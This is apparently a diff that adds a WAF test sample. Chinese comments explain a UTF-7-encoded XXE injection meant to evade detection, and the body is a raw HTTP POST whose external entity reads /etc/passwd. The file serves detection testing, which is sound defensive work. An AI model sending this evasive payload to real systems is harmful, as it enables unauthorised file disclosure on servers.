@@ -1,0 +1,21 @@
+# XML外部实体注入_utf7编码
+# 攻击者通过使用utf7编码的方式加密关键字符绕过检测，达到读取任意文件、信息探测、命令执行、dos等目的
+# 原文：
+# <?xml version="1.0" encoding="UTF-7"?>
+# <!DOCTYPE foo [
+# <!ENTITY example SYSTEM "/etc/passwd">
+# ]>
+# <stockCheck>
+# <productId>&example;</productId>
+# <storeId>1</storeId>
+# </stockCheck>
+POST /?bid=hd_tag_m8mv24mi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mi
+RM-PRO-Token: 0949fb309b61966c8d3e899029d868dd
+RM-PRO-Time: 1742808392894
+User-Agent: curl/7.83.1
+Content-Type: application/xml;charset=utf-8
+
+<!xml version="1.0" encoding="UTF-7"?-->
++ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
